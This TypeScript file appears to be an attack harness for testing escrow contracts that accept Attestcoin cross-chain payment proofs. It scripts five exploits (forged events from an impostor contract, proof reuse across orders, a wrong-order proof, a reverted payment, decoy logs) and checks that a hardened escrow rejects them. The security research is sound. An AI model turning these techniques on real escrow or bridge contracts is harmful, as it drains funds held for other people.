/**
 * The falsifier.
 *
 * Each attack builds a LEGITIMATE Attestcoin proof of something that is not the payment for the
 * order it releases, submits it to a target escrow, and records whether the escrow accepted it.
 * Every proof here would pass the precompile. That is the whole point: the precompile is not what
 * fails. The consumer's missing third check is.
 *
 * The same attacks run against two targets. Against the vulnerable escrow, an accepted attack is a
 * confirmed finding. Against the hardened escrow, every attack is expected to revert, and a real
 * payment (the positive path) is expected to release. That contrast is the demonstration.
 */
import { ethers } from "ethers";

import { buildProof, waitUntilAttested } from "./proof";

export type AttackStatus = "accepted" | "rejected" | "error";

export interface Finding {
  id: string; // catalogue id, e.g. "B-02"
  title: string;
  status: AttackStatus;
  detail: string;
  evidenceTx?: string;
  sourceTx?: string;
}

export interface BenchContext {
  cc3: ethers.JsonRpcProvider;
  sepolia: ethers.JsonRpcProvider;
  cc3Signer: ethers.Wallet;
  sepoliaSigner: ethers.Wallet;
  proverUrl: string;
  chainKey: number;
  escrow: ethers.Contract;
  escrowIsHardened: boolean;
  source: ethers.Contract;
  sourceAddress: string;
  impostor: ethers.Contract;
}

/** A fresh order id per run so reruns never collide. */
function newOrderId(tag: string): string {
  return ethers.id(`${tag}:${Date.now()}:${Math.random()}`);
}

/**
 * Funds an order on whichever target is under test. The hardened target needs the binding terms
 * up front; we set the honest expectations (real source contract, correct chain, a wide block
 * window around now) so that only a genuine matching payment can satisfy them.
 */
async function fundOrder(ctx: BenchContext, orderId: string, amountWei: bigint): Promise<void> {
  const seller = ctx.cc3Signer.address; // the account that profits from a wrongful release
  if (ctx.escrowIsHardened) {
    const head = await ctx.sepolia.getBlockNumber();
    const minHeight = head; // payment will land at or after funding
    const maxHeight = head + 5000;
    const tx = await ctx.escrow.fund(
      orderId,
      seller,
      ctx.chainKey,
      ctx.sourceAddress,
      minHeight,
      maxHeight,
      { value: amountWei }
    );
    await tx.wait();
  } else {
    const tx = await ctx.escrow.fund(orderId, seller, { value: amountWei });
    await tx.wait();
  }
}

async function attemptRelease(
  ctx: BenchContext,
  orderId: string,
  proof: Awaited<ReturnType<typeof buildProof>>
): Promise<{ status: AttackStatus; detail: string; tx?: string }> {
  try {
    const tx = await ctx.escrow.release(
      orderId,
      proof.chainKey,
      proof.height,
      proof.txBytes,
      proof.merkle,
      proof.continuity
    );
    const receipt = await tx.wait();
    return { status: "accepted", detail: "escrow released against the proof", tx: receipt!.hash };
  } catch (e) {
    return { status: "rejected", detail: extractRevert(e) };
  }
}

function extractRevert(e: unknown): string {
  const msg = e instanceof Error ? e.message : String(e);
  const named = /reverted with custom error '([^']*)'/.exec(msg)?.[1];
  if (named) return `reverted: ${named}`;
  const reason = /reverted with reason string '([^']*)'/.exec(msg)?.[1];
  if (reason) return `reverted: ${reason}`;
  return msg.split("\n")[0];
}

/** Waits for a source-chain receipt's block to be attested, then builds its proof. */
async function proveTx(
  ctx: BenchContext,
  receipt: ethers.TransactionReceipt
): Promise<Awaited<ReturnType<typeof buildProof>>> {
  await waitUntilAttested(ctx.cc3, ctx.chainKey, receipt.blockNumber);
  return buildProof(ctx.chainKey, ctx.proverUrl, receipt.hash);
}

// --- attacks -------------------------------------------------------------------------------

/**
 * B-02. The impostor contract emits PaymentSettled with the order's fields and never pays. The
 * proof of that emission is completely valid. A consumer that does not pin the emitting contract
 * releases real escrow against a free forgery.
 */
export async function attackImpostor(ctx: BenchContext, amountWei: bigint): Promise<Finding> {
  const f: Finding = { id: "B-02", title: "Emitting contract not pinned; a look-alike forges the event", status: "error", detail: "" };
  try {
    const orderId = newOrderId("impostor");
    await fundOrder(ctx, orderId, amountWei);
    const src = await (await ctx.impostor.forge(orderId, ctx.sepoliaSigner.address, ctx.cc3Signer.address, amountWei)).wait();
    f.sourceTx = src.hash;
    const proof = await proveTx(ctx, src);
    const out = await attemptRelease(ctx, orderId, proof);
    return { ...f, status: out.status, detail: out.detail, evidenceTx: out.tx };
  } catch (e) {
    return { ...f, detail: e instanceof Error ? e.message : String(e) };
  }
}

/**
 * B-06. A genuine payment on the honest contract, but for a DIFFERENT order, releases this order,
 * because the orderId in the log is never compared to the order being released.
 */
export async function attackWrongOrder(ctx: BenchContext, amountWei: bigint): Promise<Finding> {
  const f: Finding = { id: "B-06", title: "Proven payment not bound to the order it releases", status: "error", detail: "" };
  try {
    const funded = newOrderId("victim");
    const other = newOrderId("other");
    await fundOrder(ctx, funded, amountWei);
    const src = await (await ctx.source.settle(other, ctx.cc3Signer.address, { value: 1n })).wait();
    f.sourceTx = src.hash;
    const proof = await proveTx(ctx, src);
    const out = await attemptRelease(ctx, funded, proof); // release the funded order with the other's proof
    return { ...f, status: out.status, detail: out.detail, evidenceTx: out.tx };
  } catch (e) {
    return { ...f, detail: e instanceof Error ? e.message : String(e) };
  }
}

/**
 * B-04. One real payment, reused to release a second order, because the proof itself carries no
 * replay guard. Marking an order released protects that order, not the proof.
 */
export async function attackReplay(ctx: BenchContext, amountWei: bigint): Promise<Finding> {
  const f: Finding = { id: "B-04", title: "No replay guard on the proof; one payment releases many orders", status: "error", detail: "" };
  try {
    const a = newOrderId("replayA");
    const b = newOrderId("replayB");
    await fundOrder(ctx, a, amountWei);
    await fundOrder(ctx, b, amountWei);
    const src = await (await ctx.source.settle(a, ctx.cc3Signer.address, { value: amountWei })).wait();
    f.sourceTx = src.hash;
    const proof = await proveTx(ctx, src);
    const first = await attemptRelease(ctx, a, proof);
    const second = await attemptRelease(ctx, b, proof); // same proof, second order
    if (second.status === "accepted") {
      return { ...f, status: "accepted", detail: `same proof released two orders (first ${first.status})`, evidenceTx: second.tx };
    }
    return { ...f, status: second.status, detail: `first ${first.status}; second ${second.detail}` };
  } catch (e) {
    return { ...f, detail: e instanceof Error ? e.message : String(e) };
  }
}

/**
 * B-01. The source transaction emits the event and then reverts. It is still mined, still in the
 * block's Merkle tree, still provable. Its receipt carries status 0. A consumer that never reads
 * the status treats a failed payment as a completed one.
 */
export async function attackReceiptReverted(ctx: BenchContext, amountWei: bigint): Promise<Finding> {
  const f: Finding = { id: "B-01", title: "Receipt status not read; a reverted payment releases funds", status: "error", detail: "" };
  try {
    const orderId = newOrderId("reverted");
    await fundOrder(ctx, orderId, amountWei);
    // settleAndRevert emits then reverts; the tx is mined with status 0.
    let src: ethers.TransactionReceipt;
    try {
      src = await (await ctx.source.settleAndRevert(orderId, ctx.cc3Signer.address, { value: amountWei, gasLimit: 200000 })).wait();
    } catch (e) {
      // ethers throws on a reverted tx even though it was mined; recover the receipt by hash.
      const hash = (e as { receipt?: { hash?: string }; transactionHash?: string }).receipt?.hash
        ?? (e as { transactionHash?: string }).transactionHash;
      if (!hash) throw e;
      src = (await ctx.sepolia.getTransactionReceipt(hash))!;
    }
    f.sourceTx = src.hash;
    if (src.status !== 0) return { ...f, detail: `expected a reverted tx but status was ${src.status}` };
    const proof = await proveTx(ctx, src);
    const out = await attemptRelease(ctx, orderId, proof);
    return { ...f, status: out.status, detail: out.detail, evidenceTx: out.tx };
  } catch (e) {
    return { ...f, detail: e instanceof Error ? e.message : String(e) };
  }
}

/**
 * B-09. The source transaction emits decoy PaymentSettled logs before the real one. A consumer
 * that reads receiptLogs[0] and stops is reading whichever log the payer chose to put first.
 */
export async function attackNoisyLogs(ctx: BenchContext, amountWei: bigint): Promise<Finding> {
  const f: Finding = { id: "B-09", title: "Only the first log read; a decoy log wins", status: "error", detail: "" };
  try {
    const orderId = newOrderId("noisy");
    await fundOrder(ctx, orderId, amountWei);
    // Three decoy logs (order id 0,1,2, amount 0) precede the real settlement log.
    const src = await (await ctx.source.settleNoisy(orderId, ctx.cc3Signer.address, 3, { value: amountWei })).wait();
    f.sourceTx = src.hash;
    const proof = await proveTx(ctx, src);
    const out = await attemptRelease(ctx, orderId, proof);
    // Against the vulnerable target the decoy at logs[0] is what gets read; the release still
    // succeeds because the decoy shares the signature. Accepted here means the contract acted on
    // the wrong log, which is the finding.
    return { ...f, status: out.status, detail: out.detail, evidenceTx: out.tx };
  } catch (e) {
    return { ...f, detail: e instanceof Error ? e.message : String(e) };
  }
}

/**
 * The positive path. A correct payment: right contract, right order, right recipient, right amount,
 * inside the window. The hardened escrow must release it. This is what proves the checks did not
 * break the product.
 */
export async function positivePath(ctx: BenchContext, amountWei: bigint): Promise<Finding> {
  const f: Finding = { id: "POS", title: "Correct payment releases the order", status: "error", detail: "" };
  try {
    const orderId = newOrderId("positive");
    await fundOrder(ctx, orderId, amountWei);
    const src = await (await ctx.source.settle(orderId, ctx.cc3Signer.address, { value: amountWei })).wait();
    f.sourceTx = src.hash;
    const proof = await proveTx(ctx, src);
    const out = await attemptRelease(ctx, orderId, proof);
    return { ...f, status: out.status, detail: out.detail, evidenceTx: out.tx };
  } catch (e) {
    return { ...f, detail: e instanceof Error ? e.message : String(e) };
  }
}
